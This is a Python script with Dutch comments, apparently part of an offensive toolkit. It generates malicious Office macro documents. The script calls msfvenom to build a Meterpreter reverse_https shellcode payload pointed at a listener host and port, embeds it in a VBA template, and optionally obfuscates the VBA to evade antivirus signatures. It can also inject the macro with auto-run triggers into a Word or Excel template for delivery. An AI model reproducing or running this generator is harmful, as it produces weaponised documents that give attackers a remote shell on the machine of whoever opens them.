#!/usr/bin/python3

# macro2.py - Office Macro Generator met LURI ondersteuning
# Gebaseerd op macro.py, voegt LURI optie toe voor staged payloads.

from meuk.hacksec import *
from meuk.vba_inject import inject_macro, detect_doc_type, _get_triggers

parser = argparse.ArgumentParser()
parser.add_argument("lhost", help="listener IP to use")
parser.add_argument("lport", help="listener port to use",  nargs='?', default="443")
parser.add_argument("luri", help="uri to call", nargs='?', default="/")
parser.add_argument("payload", help="the payload type from msfvenom to generate shellcode for (default: windows/meterpreter/reverse_https)", nargs='?', default="windows/meterpreter/reverse_https")
parser.add_argument("--template", help="pad naar een .docx of .xlsx template om de macro in te injecteren")
parser.add_argument("-o", "--output", help="output pad voor het macro-enabled document (standaard: .docm/.xlsm)")
parser.add_argument("--obfuscate-vba", action="store_true", help="VBA macro obfuscatie toepassen")
args = parser.parse_args()

# Generate the shellcode given the preferred payload
msf_cmd = ['msfvenom', '-p', args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}"]

if args.luri and args.luri != "/":
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating payload {bcolors.OKGREEN}{args.payload}{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} LPORT={bcolors.OKGREEN}{args.lport}{bcolors.OKBLUE} LURI={bcolors.OKGREEN}{args.luri}{bcolors.ENDC}")
    msf_cmd.append(f"LURI={args.luri}")
else:
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating payload {bcolors.OKGREEN}{args.payload}{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")

msf_cmd.extend(['exitfunc=thread', "-f", "vbapplication"])

result = subprocess.run(msf_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

if result.returncode != 0:
    print(f"{bcolors.BOLD}{bcolors.FAIL}[x] msfvenom stderr:{bcolors.ENDC}\n{result.stderr.decode('utf-8', errors='replace')}")
    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Msfvenom generation unsuccessful (rc={result.returncode}). Are you sure msfvenom is installed?{bcolors.ENDC}")

template=lezen('meuk/template/officemacro')

payload = result.stdout

#create the payload
macro = template.replace('[payloadreplace]', payload.decode('utf-8'))

if args.obfuscate_vba:
    from obfuscate_av import obfuscate_vba
    macro, vba_stats = obfuscate_vba(macro)
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] VBA obfuscatie: {vba_stats['string']} signatures aangepast{bcolors.ENDC}")

if args.template:
    # Injecteer macro in Office document
    doc_type = detect_doc_type(args.template)
    triggers = _get_triggers(doc_type)
    macro_with_triggers = macro + triggers

    out = inject_macro(args.template, macro_with_triggers, args.output)
    print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] Macro geïnjecteerd in: {out}{bcolors.ENDC}")
else:
    #create the file with raw ouput
    schrijven('http/payloads/office_macro2.txt', macro)
    print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] Macro geschreven naar: http/payloads/office_macro2.txt{bcolors.ENDC}")
